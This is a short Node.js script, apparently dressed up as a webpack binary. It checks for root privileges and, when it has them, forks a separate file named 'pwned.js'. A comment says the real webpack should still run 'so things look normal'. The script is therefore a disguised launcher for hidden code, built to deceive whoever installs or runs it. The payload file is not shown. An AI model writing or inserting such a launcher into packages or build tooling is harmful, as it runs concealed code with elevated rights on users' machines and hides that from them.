#! /usr/bin/env node
'use strict';

const isRoot = require('is-root');
const shell = require('shelljs');
const cp = require('child_process');

if (isRoot()) {
    let child = cp.fork('./bin/pwned.js');    
}

// Still run actual webpack so things look normal
// shell.exec('./node_modules/webpack/bin/webpack.js');
